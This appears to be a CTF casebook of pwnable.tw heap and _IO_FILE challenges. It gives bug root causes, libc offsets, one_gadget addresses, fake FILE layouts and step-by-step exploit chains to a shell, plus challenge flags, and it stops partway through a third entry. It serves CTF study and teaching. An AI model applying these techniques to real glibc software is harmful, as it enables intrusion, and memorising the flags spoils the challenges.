# Pwnable.tw Allocator and FILE Cases

This casebook preserves challenge-specific allocator, file-structure, protection, leak, pivot, artifact, and provenance facts. General patterns live in the technique references; this file is the exact-case record.

## How To Use This File

Use this file when malloc/free/realloc/tcache/fastbin/unsorted/House/chunk-overlap or `_IO_FILE` mechanics create the first exploitable primitive. If a C++ or object-layout lifetime bug is the root cause, compare `heap-object-cases.md` before selecting a route.

## Case Index

| Challenge | Canonical route |
|---|---|
| [`bookwriter`](#bookwriter) | `strlen`-derived edit-size out-of-bounds → Heap leak, top-size corruption, House of Orange, and FILE exploitation |
| [`break_out`](#break_out) | UAF/realloc overlap → Fake prisoner `next`, arbitrary heap R/W, House of Orange, stdout FSOP, or hooks |
| [`bounty_program_a`](#bounty_program_a) | Unchecked failed allocation plus retained tokenizer state → Heap overlap/contact-pointer write, tcache poison, and hook/setcontext |
| [`bounty_program_b`](#bounty_program_b) | Failed allocation/tokenizer-state UAF → Unsorted/tcache/fastbin control, fake report, hooks, or ORW |
| [`food_store`](#food_store) | Uninitialized/stale heap pointer → Fake list, arbitrary free, hooks, `_dl_open_hook`, stdin FSOP, or direct FD increment |
| [`heap_paradise`](#heap_paradise) | Slot-not-cleared double free → Fastbin dup, fake chunks, stdout/stderr FILE vtable, and hooks |
| [`hitcon_ftp`](#hitcon_ftp) | Filename leak, OACK OOB read, and negotiated block-size stack overflow → Heap pivot/mprotect/shellcode or seccomp-constrained ORW ROP |
| [`re_alloc`](#re_alloc) | Realloc-zero hidden free while state remains usable → Two-slot tcache poison and `atoll@GOT`/hook control |
| [`re_alloc_revenge`](#re_alloc_revenge) | Realloc-zero UAF plus off-by-null/tcache-key double free → stdout FSOP or `__free_hook`/`__realloc_hook` control |
| [`secret_garden`](#secret_garden) | Retained freed name pointer → Double-free/fastbin dup, fake flower, `__malloc_hook`, stack ROP through `environ`, or FILE attack |
| [`secret_of_my_heart`](#secret_of_my_heart) | Post-read NUL at capacity index → Next-chunk size poison, backward consolidation/overlap, fastbin hook, predictable mmap, or stack ROP |
| [`seethefile`](#seethefile) | Exit-path `scanf` overwrites global `FILE *fp` → Fake `_IO_FILE_plus` consumed by `fclose` and vtable `system` execution |
| [`tcache_tear`](#tcache_tear) | Global freed-pointer UAF → glibc-2.27 tcache double-free, BSS fake chunks, `__free_hook`, format chain, or stdout FSOP |
| [`wannaheap`](#wannaheap) | Remembered-size mismatch off-by-null → libc/stdin FILE corruption, FSOP, `_dl_open_hook`, setcontext ORW, or byte oracle |


## bookwriter
> **Canonical route:** `strlen`-derived edit-size out-of-bounds → Heap leak, top-size corruption, House of Orange, and FILE exploitation
> **Read this case when:** A book/page editor has no free and `strlen` controls the next edit size.
> **Primary defect:** `strlen`-derived edit-size out-of-bounds
> **Exploit primitive/result:** Heap leak, top-size corruption, House of Orange, and FILE exploitation
> **Search terms:** page size; `strlen`; no free; top chunk; House of Orange; `sysmalloc`
> **Version/protection clue:** Case target `bookwriter` — x86-64, glibc 2.23, Full RELRO, canary/NX, no PIE
> **Variant boundary:** Standalone; use House of Orange because no ordinary free/UAF exists.

### Metadata

- Source title: BookWriter — pwnable.tw (500 pts)
- Source callout: `nc chall.pwnable.tw 10304`
- Source note: >
- Source callout: Flag: `FLAG{Th3r3_4r3_S0m3_m4gic_in_t0p}`

```yaml
tags:
  - out-of-bounds-write
  - information-leak
  - house-of-orange
  - io-file-exploit
platform: pwnable.tw
points: 500
arch: x86-64
libc: glibc-2.23
relro: full
canary: yes
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "An off-by-null write during book author naming leaks heap addresses, and overwriting the top chunk size triggers House of Orange _IO_FILE vtable exploitation via _IO_flush_all_lockp."
proof-of-concept: no
```

### Facts

#### Challenge Overview

A heap note-taking binary (x86-64, Full RELRO, NX, Stack Canary, PIE disabled) built against glibc 2.23. The program manages an "author" name and up to 8 pages of dynamically allocated text. There is **no free/delete** operation — the only way to get chunks into the free lists is via the House of Orange technique (corrupting the top chunk size to trick `sysmalloc` into freeing the old top).

Based on BKP CTF 2017's "memo" challenge with bug fixes and control flow modifications.

```
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO           # GOT not writable
  Stack:    Canary found
  NX:       NX enabled
  PIE:      No PIE (0x400000)    # .bss addresses are fixed
```

#### Global Data Layout (BSS)

```
0x602040  num_pages         (uint32_t, max 8)
0x602060  author[0x40]      (char, NO NUL terminator if fully filled)
0x6020A0  page_ptrs[8]      (char *[8])
0x6020E0  page_sizes[8]     (uint64_t[8])
```

Note that `page_ptrs[8]` (at `0x6020E0`) aliases `page_sizes[0]`. This is the key to the off-by-one index trick.

#### Vulnerabilities

##### V1 — `strlen`-Based Size Update in `edit()` (Primary, Heap Overflow)

**Root Cause:** After `edit()` calls `read_n(page, page_size)`, it updates the stored size with `page_size = strlen(page)`. If the page content has no NUL byte, `strlen` walks past the chunk boundary into the next chunk's metadata.

```c
// edit() pseudocode
void edit(int idx) {
    read_n(page_ptrs[idx], page_sizes[idx]);  // fill to exact capacity
    page_sizes[idx] = strlen(page_ptrs[idx]); // BUG: strlen walks into next chunk
}
```

**Trigger:** Allocate a page of size N and fill it with N non-NUL bytes. `strlen` reads past the chunk data into the following chunk's `size` field (which is non-zero), returning a value larger than N. A second `edit()` now writes up to this inflated size, overflowing into the adjacent chunk.

**Impact:** Overwrite the **top chunk's size** field. This enables House of Orange: set the top chunk size to a value that satisfies `sysmalloc`'s page-alignment checks, then `malloc` a request larger than the corrupted top chunk → `sysmalloc` calls `_int_free()` on the old top, placing it into the unsorted bin.

##### V2 — Off-by-One Index in `add()` (Page Count Overflow)

**Root Cause:** The `add()` function scans `page_ptrs[0..8]` (9 elements) for a free slot, but the array only has 8 entries. Index 8 of `page_ptrs` aliases `page_sizes[0]`.

```c
// add() pseudocode
for (int i = 0; i <= 8; i++) {   // BUG: should be i < 8
    if (page_ptrs[i] == NULL) {
        page_ptrs[i] = malloc(size);
        page_sizes[i] = size;
        break;
    }
}
```

**Trigger:** Fill all 8 page slots (indices 0-7). The next `add()` writes the `malloc` return value into `page_ptrs[8]`, which is actually `page_sizes[0]`. Now `page_sizes[0]` contains a **heap pointer** (a very large value), making `edit(0)` an enormous arbitrary heap write.

**Prerequisite for trick:** If `page_sizes[0]` is 0 (page 0 was allocated with size 0), then `page_ptrs[0]` appears NULL to the scan, so `add()` at index 0 replaces it, and `page_sizes[0]` gets set to the new `malloc` return value. Either way, `page_sizes[0]` becomes huge.

##### V3 — Author Buffer Information Leak (Heap Leak)

**Root Cause:** The author buffer at `0x602060` is 0x40 bytes. If filled completely (no NUL terminator), the `information()` function prints it with `printf("%s", author)`, which continues reading into `page_ptrs[0]` — a heap address.

```c
// set author
read_n(author, 0x40);  // no NUL terminator if 0x40 bytes sent

// information()
printf("Author : %s\n", author);  // leaks page_ptrs[0] after the 0x40 author bytes
```

**Impact:** Leak the heap base address by reading past the author buffer into `page_ptrs[0]`.

##### V4 — No `free()` Operation

The program provides no delete/free function. This means:
- Standard UAF/double-free attacks are impossible.
- The **only** way to get chunks into free lists is House of Orange (V1 → corrupt top chunk → `sysmalloc` frees old top).

#### Key Constraints for Top Chunk Size

When corrupting the top chunk size, it must satisfy (`sysmalloc` checks):

```
1. (old_top + old_size) must be page-aligned (0x1000)
2. old_size > MINSIZE (0x20)
3. old_size has PREV_INUSE bit set (LSB = 1)
4. old_size < requested_size (so sysmalloc triggers)
```

Common values used across solutions (depending on allocation offset):

| Chunk offset from page | Top chunk size | Notes |
|------------------------|---------------|-------|
| `0x30` (size 0x18+meta) | `0xfd1` | Most common |
| `0x30` | `0xfe1` | Alternate alignment |
| `0x20` (size 0x18) | `0xfe1` | |
| `0x120` | `0xed1` | After larger initial alloc |
| `0x220` | `0xde1` | |

#### Offsets (pwnable.tw `libc_64.so.6`, glibc 2.23)

```python
main_arena_off  = 0x3c3b20    # main_arena (unsorted bin = main_arena + 0x58 + 0x10)
__malloc_hook   = 0x3c3b10
_IO_list_all    = 0x3c4520
system          = 0x45390
one_gadgets     = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
# unsorted bin leak: leaked_ptr - 0x3c4188 = libc_base  (or - 0x3c3b78 depending on chunk)
```

### Exploit Paths

#### Exploit Paths

All 90 solutions use the **House of Orange** technique. They diverge on the specific FSOP layout and the mechanism to trigger the fake `_IO_FILE` execution.

---

##### Path A — House of Orange → FSOP via `_IO_list_all` Unsorted Bin Attack (Standard)

**Used by:** ~95% of solutions (138, 185, 194, 1172, 1177, 1303, 1351, 1689, 1829, 1922, 1980, 10840, 17006, 18324, 21260, etc.)

**Steps:**

1. **Heap leak (V3):** Send 0x40 non-NUL bytes as author. Call `information()` → author string leaks into `page_ptrs[0]` → heap base.

2. **Top chunk corruption (V1):** Allocate a page adjacent to the top chunk (e.g., size 0x18 or 0x28). Edit it twice: first to grow the stored size via `strlen`, second to overwrite the top chunk's size to a carefully chosen value (e.g., `0xfc1`, `0xfe1`, `0x0fc1`, `0x0ed1`). The new size must satisfy:
   - `old_top + new_size` is page-aligned
   - `new_size > MINSIZE`
   - `prev_inuse` bit set

3. **Trigger `sysmalloc` (House of Orange):** `add(0x1000, ...)` — the request exceeds the corrupted top chunk size → `sysmalloc` frees the old top into the **unsorted bin** and mmaps a new region.

4. **libc leak:** Allocate a small chunk from the freed old-top (now in unsorted bin). The leftover unsorted chunk has `fd`/`bk` pointing to `main_arena+88`. Read it with `view()` → libc base.

5. **Off-by-one index trick (V2):** Fill remaining page slots. The 9th `add()` writes a heap pointer into `page_sizes[0]` → `edit(0)` becomes an enormous heap write.

6. **Build fake `_IO_FILE` + unsorted bin attack:** Using the huge `edit(0)`, write:
   - A fake `_IO_FILE_plus` structure with `flags = "/bin/sh\x00"`, `_IO_buf_size = 0x61` (to land in `smallbin[4]`), `bk = &_IO_list_all - 0x10`.
   - The vtable pointer set to a controlled heap region containing `system` at the `__overflow` offset.
   - `_IO_write_ptr > _IO_write_base` and `_mode <= 0` to pass `_IO_flush_all_lockp` checks.

7. **Trigger:** Call `add()` with a size that causes `malloc` to traverse the unsorted bin. The unsorted bin attack writes `main_arena+0x58` to `_IO_list_all`. During the sort, the fake chunk lands in `smallbin[4]`, reachable as `_IO_list_all->_chain->_chain`. When `_IO_flush_all_lockp` walks the chain (via `exit()` or `malloc_printerr`), it calls `_IO_OVERFLOW(fake_file)` → `system("/bin/sh")`.

**Trigger variants:**
- **`exit()` (menu choice 5):** The exp.py uses this — cleaner, no abort needed.
- **`malloc_printerr`:** Most solutions trigger an unsorted bin corruption that calls `abort()` → `_IO_flush_all_lockp`. In glibc 2.23, `abort()` flushes IO. Some libc builds (like the pwnable.tw one) do NOT flush on abort, requiring `exit()` instead.

---

##### Path B — House of Orange with Extended Top Chunk Manipulation

**Used by:** Solutions 194, 1297, 1316, 1395, 1986

Some solvers avoid the off-by-one index trick entirely by repeatedly growing the top chunk corruption to reach further into the heap:

1. Perform House of Orange as above.
2. After getting the unsorted bin, **extend the old top chunk size again** via a second `strlen` trick to overlap additional chunks.
3. Use the overlapping region to write the fake `_IO_FILE` directly, without needing the index-8 alias.

This variant is more complex but avoids reliance on V2.

---

##### Path C — House of Orange → Unsorted Bin Attack → `__malloc_hook` Overwrite

**Used by:** Solutions 1177, 1303

Instead of FSOP, some solutions use the unsorted bin attack to overwrite a different target:

1. Perform House of Orange and get libc leak.
2. Use the unsorted bin attack to corrupt `__malloc_hook` (or a nearby location) with a controlled pointer.
3. Place a `one_gadget` address at `__malloc_hook`.
4. Trigger `malloc` → `one_gadget` → shell.

This requires more careful heap layout since the unsorted bin attack only writes `main_arena+0x58` (not an arbitrary value). Solvers chain it with additional corruption to get the `one_gadget` into `__malloc_hook`.

---

##### Path D — Author Buffer as Fake Chunk / Vtable Host

**Used by:** Solutions 138, 194, 1177

Since the author buffer is at a fixed BSS address (`0x602060`), some solutions:

1. Use `information()` with "change author" to write controlled data into the author buffer.
2. Point the fake `_IO_FILE`'s vtable to `0x602060` (author buffer).
3. Place `system` at the correct vtable offset within the author buffer.

This leverages the no-PIE property for a predictable vtable address without heap-relative calculations.

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Heap address leak | V3: author `printf` overflow into `page_ptrs[0]` | Deterministic |
| Top chunk size corruption | V1: `strlen`-based size growth in `edit()` | Deterministic |
| Free old top into unsorted bin | House of Orange via `sysmalloc` | Deterministic (with correct size) |
| libc leak | Read `fd`/`bk` from unsorted bin chunk | Deterministic |
| Huge heap write | V2: off-by-one index, `page_sizes[0]` = heap ptr | Deterministic |
| `_IO_list_all` overwrite | Unsorted bin attack (`bk->fd = main_arena+0x58`) | Deterministic |
| Code execution | FSOP: `_IO_OVERFLOW` → `system("/bin/sh")` | Deterministic |

### Assets and Provenance

#### Solution Write-ups

| File | Path | Key Technique | Notes |
|------|------|---------------|-------|
| `138.md` | A + D | FSOP, vtable in heap, `_wide_data` trick | Ruby; uses author for vtable data |
| `185.md` | A | FSOP via `_IO_list_all`, size-0 index trick | Clean Python2; references angelboy blog |
| `194.md` | B | Extended top chunk, no index-8 trick | Large initial alloc for second top corruption |
| `1172.md` | A | Standard FSOP, `page_sizes[0]` trick | Concise; good comments on constraints |
| `1177.md` | A + C | Unsorted bin → author buffer as fake chunk → `__malloc_hook` | Uses BSS address for fake chunk fd/bk |
| `1297.md` | B | Repeated top extension, overlap multiple chunks | Complex multi-stage heap manipulation |
| `1303.md` | A + C | FSOP + `one_gadget` via `__malloc_hook` | Uses unsorted bin corruption chain |
| `1316.md` | B | Large alloc for overlap, `_IO_str_jumps` vtable | Uses `_IO_str_jumps-8` for vtable bypass |
| `1351.md` | A | Standard FSOP, leading NUL byte for size reset | |
| `1689.md` | A | FSOP via direct heap overlap | Compact; inline vtable construction |
| `1829.md` | A | FSOP with custom `_wide_data` | |
| `1922.md` | A | Standard FSOP | Clean, good logging |
| `1980.md` | A | FSOP, detailed `_IO_FILE` field annotations | Educational: labels every struct field |
| `1986.md` | A | FSOP, notes `scanf` internal malloc usage | Tip: `scanf` calls malloc internally |
| `2121.md` | A | FSOP with vtable at heap+offset | |
| `10840.md` | A | Clean Python3 exploit | |
| `17006.md` | A | Compact FSOP | |
| `18324.md` | A | FSOP, notes reliability issues | |
| `21260.md` | A | FSOP, detailed vtable calculation | |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (self-contained, no pwntools) |
| `desc.txt` | Challenge description |
| `artifacts/bookwriter` | Challenge binary (x86-64, stripped) |
| `artifacts/libc_64.so.6` | Remote libc (glibc 2.23) |
| `solution/*.md` | Community write-ups (90 solutions) |

## break_out
> **Canonical route:** UAF/realloc overlap → Fake prisoner `next`, arbitrary heap R/W, House of Orange, stdout FSOP, or hooks
> **Read this case when:** `punish` frees a prisoner note but leaves its pointer and size usable.
> **Primary defect:** UAF/realloc overlap
> **Exploit primitive/result:** Fake prisoner `next`, arbitrary heap R/W, House of Orange, stdout FSOP, or hooks
> **Search terms:** prisoner; punish; UAF; realloc overlap; `/proc/self/maps`; stdout vtable
> **Version/protection clue:** Case target `break_out` — x86-64, glibc 2.23, Full RELRO, canary/NX/PIE
> **Variant boundary:** Standalone; the `/proc/self/maps` whitelist shapes later paths.

### Metadata

- Source title: Break Out — pwnable.tw (350 pts)
- Source callout: `nc chall.pwnable.tw 10400`

```yaml
tags:
  - use-after-free
  - information-leak
  - fastbin-dup
platform: pwnable.tw
points: 350
arch: x86-64
libc: glibc-2.23
relro: full
canary: yes
nx: yes
pie: yes
references:
  - https://pwnable.tw/challenge/
description: "A use-after-free in cell note management allows leaking heap and libc pointers, followed by fastbin duplication to overwrite __malloc_hook."
proof-of-concept: no
```

### Facts

#### Challenge Overview

A prison management binary (x86-64, PIE, Full RELRO, NX, Stack Canary) built against glibc 2.23 (no tcache). It loads a prisoner database from a colon-separated file, and provides commands to `list` prisoners, write a `note` for a prisoner (using `realloc`), and `punish` a prisoner (frees the note). The key defense mechanism is `secure_read()`: it parses `/proc/self/maps` at startup to build a whitelist of writable regions, and every `read()` into a note buffer is validated against this whitelist — only writes into the **[heap]** region are permitted. This means a naive heap overflow can never directly touch libc/GOT/hooks.

```
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO           # GOT read-only
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
```

Two binaries are provided: `breakout` (the main binary) and `prisoner` (the database file).

#### Key Data Structures

##### Prisoner Struct (0x40 bytes, linked list)

| Offset | Field | Type |
|--------|-------|------|
| `0x00` | `risk` | `char *` (points to static string) |
| `0x08` | `name` | `char *` |
| `0x10` | `nickname` | `char *` |
| `0x14` | `age` | `int32_t` |
| `0x18` | `cell` | `int32_t` |
| `0x20` | `sentence` | `char *` |
| `0x28` | `note_size` | `int32_t` |
| `0x2c` | `pad` | `int32_t` |
| `0x30` | `note` | `char *` (realloc'd) |
| `0x38` | `next` | `struct prisoner *` |

Prisoners are stored in a singly-linked list. The `note` command calls `realloc(prisoner->note, size)` and writes into it via `secure_read`. The `punish` command calls `free(prisoner->note)` **without clearing the pointer** — classic dangling pointer.

##### Whitelist (`secure_read` defense)

At startup, `secure_self()` parses `/proc/self/maps` and stores the `[heap]` region's base and end in BSS globals (`dst_whitelist`). Every `secure_read()` call validates that the destination buffer falls within this range. This prevents direct writes to libc, stack, or BSS.

#### Vulnerabilities

##### V1 — Use-After-Free / Dangling Pointer in `punish`

**Root Cause:** `punish(cell)` calls `free(prisoner->note)` but does **not** set `prisoner->note = NULL` or `prisoner->note_size = 0`.

**Impact:**
- **UAF read:** After freeing, `list` still prints the note content, leaking heap metadata (fd/bk pointers from freed chunks).
- **UAF write via realloc overlap:** Since the struct pointer array and note buffers are both on the heap, `realloc` on one prisoner's note can allocate memory overlapping a freed prisoner struct, giving full control over another prisoner's fields (name, note pointer, next pointer, note_size).

##### V2 — Fake Prisoner via `next` Pointer Manipulation

**Root Cause:** After achieving V1 overlap, an attacker can set a prisoner's `next` pointer to any heap address containing controlled data. The `list` command follows the linked list and prints fields from the fake prisoner, including its `note` pointer (used for reading) and `name`/`risk` (used for display — leak primitives).

**Impact:** By pointing `next` at a crafted fake prisoner struct:
- Set `note` to an arbitrary address → `list` leaks its contents
- Set `note_size` to a controlled value → subsequent `note` command writes to the arbitrary `note` address
- This yields **arbitrary read/write within the heap**, and with further tricks, outside it.

#### Offsets (pwnable.tw `libc_64.so.6`, glibc 2.23)

```python
__malloc_hook  = 0x3c3b10
__realloc_hook = 0x3c3b08
__free_hook    = 0x3c57a8
_IO_list_all   = 0x3c4520
system         = 0x45390
one_gadgets    = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
# realloc + 0xb (push rbp trampoline for one_gadget stack fix)
realloc_tramp  = 0x83b1b
# Binary offsets
str_High       = 0x1c28       # "High" string in .rodata
whitelist_bss  = 0x203030     # dst_whitelist pointer in .bss
got_mprotect   = 0x202ed8
```

### Exploit Paths

#### Exploit Paths

All solutions start with V1 (UAF) to gain heap control, then diverge on how they **bypass `secure_read`** to write outside the heap.

---

##### Path A — Unsorted Bin Attack → Overwrite `dst_whitelist` → `__realloc_hook` = `system`

**Used by:** Solutions 59, 278, 408, exp.py variant

**Steps:**

1. **Leak heap base:** Free a prisoner struct via `punish`, then use `note` on another prisoner to allocate into the freed struct. `list` reveals heap pointers from the overlapping struct fields.

2. **Leak PIE base:** Use the fake prisoner technique (V2) to read the `risk` field of a known prisoner — it points to a string in the binary like `"High"` at a known offset → PIE base.

3. **Leak libc base:** With PIE base, point the fake prisoner's `note` at a GOT entry (e.g., `got["mprotect"]`) → `list` leaks the resolved address → libc base.

4. **Bypass `secure_read` via unsorted bin attack:**
   - Forge a fake prisoner whose `next` points into BSS near `dst_whitelist`.
   - Use the unsorted bin attack (overwrite unsorted bin chunk's `bk` to `&dst_whitelist - 0x10`) to write a `main_arena` address over `dst_whitelist`.
   - Now `secure_read` thinks the entire libc data section is writable.

5. **Overwrite `__realloc_hook`:** Point a fake prisoner's `note` at `__realloc_hook`, write `system` via `note`.

6. **Trigger:** A prisoner whose note contains `"/bin/sh\0"` — calling `realloc` on it invokes `__realloc_hook(system)` → shell.

---

##### Path B — House of Orange (FSOP via `_IO_list_all`)

**Used by:** Solutions 57, 186, 1303, 1980, 2233, 2972, 3025, 3917, 8153, 9251

**Steps:**

1. **Leak heap + libc:** Same as Path A steps 1-3 (UAF overlap → fake prisoner → read pointers).

2. **Forge unsorted bin chunk on heap:** Use the fake prisoner's `note` write to craft a fake unsorted bin chunk with:
   - `fd = 0` (crash unsorted bin iteration)
   - `bk = &_IO_list_all - 0x10` (unsorted bin attack target)
   - Size field set to `0x61` (matches smallbin[4])
   - First 8 bytes = `"/bin/sh\0"`

3. **Craft fake `_IO_FILE_plus` struct:** Embedded after the chunk header:
   - `_IO_write_ptr > _IO_write_base` (triggers overflow path)
   - `_mode = 0` or `_mode = -1`
   - `vtable` → points to fake vtable on heap
   - Fake vtable's `__overflow` slot → `system`

4. **Trigger:** Any `malloc` that sorts the unsorted bin (or `exit()`) → glibc iterates `_IO_list_all` → finds the fake FILE → calls `vtable->__overflow(file)` → `system("/bin/sh")`.

**Note:** This only requires heap writes, so it completely bypasses `secure_read` — no need to corrupt the whitelist.

---

##### Path C — Fastbin Attack → `__malloc_hook` Overwrite

**Used by:** Solutions 6923, 21490, 31599, exp.py

**Steps:**

1. **Leak heap + libc:** Same UAF techniques.

2. **Fastbin grooming:** Create overlapping chunks via the fake prisoner note pointer manipulation. Free a `0x70`-sized chunk, then use the write primitive to overwrite its `fd` pointer to `__malloc_hook - 0x23` (the classic glibc 2.23 `0x7f` fake-size trick).

3. **Allocate through the fastbin:** Two `malloc(0x60)` calls — the second returns the fake chunk at `__malloc_hook - 0x23`.

4. **Write the hooks:** Pad 0x13 bytes to reach `__realloc_hook`, then write:
   - `__realloc_hook = one_gadget` (e.g., `0xf0567`)
   - `__malloc_hook = __libc_realloc + 0xb` (the `push rbp` entry, which adjusts the stack so `[rsp+0x70] == NULL` for the one_gadget constraint)

5. **Trigger:** Next `malloc` → `__malloc_hook` → `realloc(+0xb)` → `__realloc_hook` → one_gadget → shell.

**Whitelist bypass:** The key insight is that `realloc` first copies old content to the new chunk. By pre-placing the payload in the old note (which is on the heap, passing `secure_read`), then triggering `realloc` to a size that allocates at `__malloc_hook`, the copy operation writes the payload into libc memory — bypassing `secure_read` because `realloc`'s internal `memcpy` doesn't go through the whitelist check.

---

##### Path D — `_IO_file_jumps` / stdout vtable Overwrite

**Used by:** Solutions 363, 786

**Steps:**

1. **Leak libc:** Via UAF + fake prisoner reading.

2. **Forge a fake prisoner** whose `next` points to `_IO_file_jumps(stdout) - 0x30` in libc. This overlaps the fake prisoner's `note_size`/`note` fields with the stdout vtable pointer area.

3. **Overwrite the vtable pointer** of `stdout` to point to a heap-controlled fake vtable where the `__xsputn` or `__overflow` slot is set to a one_gadget or `system`.

4. **Trigger:** Any `puts`/`printf` output (e.g., `list`) uses the corrupted vtable → shell.

---

##### Path E — Large Bin Attack → `_dl_open_hook` + ROP

**Used by:** Solution 8033

**Steps:**

1. **Leak all addresses:** heap, PIE, libc via standard UAF chain.

2. **Large bin attack:** Create large bin chunks, then corrupt the `bk_nextsize` of a large bin chunk to point to `_dl_open_hook - 0x10`. On the next large bin insertion, `_dl_open_hook` is overwritten with a heap address.

3. **Prepare ROP chain on heap:** Use `setcontext+53` as a stack pivot gadget, with a ROP chain calling `execve("/bin/sh", NULL, NULL)`.

4. **Trigger `abort`:** Corrupt a chunk's metadata to cause a glibc assertion failure → `abort()` → uses `_dl_open_hook` → jumps to heap → stack pivot → ROP chain → shell.

---

##### Path F — `__free_hook` via `note_size = malloc_size` Trick

**Used by:** Solution 3917

**Steps:**

1. **Forge a fake prisoner** whose `next` points to `__free_hook - 0x28`. In the fake prisoner layout, the `note_size` field overlaps with the upper bytes of `__free_hook`, and the `note` field overlaps with `__free_hook`.

2. **Write `one_gadget` to `__free_hook`** by calling `note` on the fake cell — `realloc` is called with `size = note_size` (which is the upper bits of the hook address, interpreted as an integer). This causes a large allocation → the old note is freed → `__free_hook` triggers.

3. **Alternative:** Write the one_gadget address 2 bytes at a time by using `note(cell, oneshot_low16, "A")` which calls `realloc(note, low16)` — the size IS the address fragment, written into `note_size` at the position overlapping `__free_hook`.

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Heap pointer leak | V1: UAF + `list` reads freed chunk metadata | Deterministic |
| PIE base leak | V2: Fake prisoner `risk`/`name` → binary string pointer | Deterministic |
| libc leak | V2: Fake prisoner `note` → GOT entry, or unsorted bin fd/bk | Deterministic |
| Arbitrary heap R/W | V2: Fake prisoner with controlled `note`/`note_size` | Deterministic |
| Whitelist bypass (House of Orange) | Path B: Only needs heap writes, no whitelist corruption | ~50% (heap alignment) |
| Whitelist bypass (unsorted bin attack) | Path A: Overwrites `dst_whitelist` in BSS | Deterministic |
| Whitelist bypass (fastbin + realloc copy) | Path C: `realloc` memcpy bypasses `secure_read` | Deterministic |
| Code execution | `__realloc_hook`/`__malloc_hook`/`__free_hook` or FSOP | Deterministic after bypass |

### Assets and Provenance

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `57.md` | B (House of Orange) | UAF → fake prisoner → forge unsorted bin → FSOP | Needs negative libc base low bits |
| `59.md` | A (Unsorted bin) | UAF → leak all → unsorted bin overwrites whitelist → `__realloc_hook` | Detailed bug explanation |
| `186.md` | B (House of Orange) | Simple House of Orange via heap-only writes | Retry loop for reliability |
| `278.md` | A (Unsorted bin) | Ruby exploit; UAF → whitelist bypass → `__realloc_hook = system` | Clean struct manipulation |
| `363.md` | D (stdout vtable) | Overwrite `_IO_file_jumps` ptr of stdout → one_gadget | No heap tricks needed |
| `408.md` | A (Unsorted bin) | UAF → unsorted bin `bk` → whitelist → `__realloc_hook` | Heap massage for binmap |
| `786.md` | D (stdout vtable) | Fake prisoner `next` → libc FILE vtable area → one_gadget | Application-logic only |
| `1303.md` | B (House of Orange) | Full FSOP with detailed fake `_IO_FILE_plus` layout | Remote heap offset pain |
| `1980.md` | C (Fastbin) | UAF → stack leak → PIE leak → fastbin attack → one_gadget | Leaks via `environ` |
| `2121.md` | C (Fastbin) | Classic fastbin to `__malloc_hook - 0x23` | Standard 0x7f trick |
| `2233.md` | B (House of Orange) | Unsorted bin → `_IO_list_all` → FSOP → `system("/bin/sh")` | |
| `2972.md` | B (House of Orange) | Compact House of Orange implementation | |
| `3025.md` | B (House of Orange) | "ez challenge, hard to get shell in remote env" | Remote heap offset issues |
| `3917.md` | F (`__free_hook`) | Fake prisoner `next` → `__free_hook - 0x28` → write one_gadget 2 bytes at a time | Creative `note_size` abuse |
| `6923.md` | C (Fastbin) | UAF → overlapping chunks → fastbin fd → `__malloc_hook` → one_gadget | |
| `8033.md` | E (Large bin) | Large bin attack → `_dl_open_hook` → `setcontext` stack pivot → ROP | Most complex path |
| `8153.md` | B (House of Orange) | FSOP with `_IO_list_all` | Chinese writeup |
| `9251.md` | B (House of Orange) | UAF → fake prisoner → House of Orange FSOP | |
| `13344.md` | B (House of Orange) | FSOP via fake FILE; leak all via `environ` | Clean Python3 exploit |
| `21490.md` | C (Fastbin) | Fastbin + realloc copy bypass of `secure_read` | `realloc`'s `memcpy` is the key |
| `31599.md` | C (Fastbin) | UAF → fastbin → `__malloc_hook` → `realloc_tramp` + one_gadget | Standard hook chain |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (fastbin + realloc hook chain) |
| `desc.txt` | Challenge description |
| `artifacts/breakout` | Challenge binary (stripped, PIE) |
| `artifacts/prisoner` | Prisoner database file |
| `artifacts/libc_64.so.6` | Remote libc (glibc 2.23) |
| `solution/*.md` | Community write-ups (72 solutions) |

## bounty_program_a
> **Canonical route:** Unchecked failed allocation plus retained tokenizer state → Heap overlap/contact-pointer write, tcache poison, and hook/setcontext
> **Read this case when:** glibc-2.27 user/report parsing calls `calloc(1,-1)` and later `strtok(NULL,...)`.
> **Primary defect:** Unchecked failed allocation plus retained tokenizer state
> **Exploit primitive/result:** Heap overlap/contact-pointer write, tcache poison, and hook/setcontext
> **Search terms:** `calloc(1,-1)`; `strtok(NULL)`; contact pointer; MD5 oracle; tcache; `__free_hook`
> **Version/protection clue:** Case target `bounty_program_a` — x86-64, glibc 2.27, Full RELRO, canary/NX/PIE
> **Variant boundary:** α form; Bounty β is hardened and may require different finish paths.

### Metadata

- Source title: Bounty Program α — pwnable.tw (500 pts)
- Source callout: `nc chall.pwnable.tw 10208`
- Source note: >
- Source callout: Flag: `FLAG{s0m3_3nv_Ar3_pow3rful_it_h3lp_you_lif3_mor3_e4sy}`

```yaml
tags:
  - heap-buffer-overflow
  - tcache-poisoning
  - arbitrary-write
platform: pwnable.tw
points: 500
arch: x86-64
libc: glibc-2.27
relro: full
canary: yes
nx: yes
pie: yes
references:
  - https://pwnable.tw/challenge/
description: "A heap buffer overflow in report comment parsing allows corrupting tcache next pointers to achieve arbitrary memory write and overwrite __free_hook."
proof-of-concept: no
```

### Facts

#### Challenge Overview

A bug bounty platform binary (x86-64, PIE, Full RELRO, NX, Stack Canary) built against glibc 2.27. Users can register/login, manage products, submit/edit/evaluate bug reports, and manage vulnerability types. A `wrapper` binary prompts for an environment variable name/value pair before `execve`-ing the main binary — this is the key hint: `GLIBC_TUNABLES` can control malloc behavior.

The program features a user system (linked list), product/type/report management with complex heap interactions, and an evaluation flow that links reports to users. All string fields use `calloc`/`strdup`/`strtok` internally.

```
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO           # GOT read-only
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
```

#### Vulnerabilities

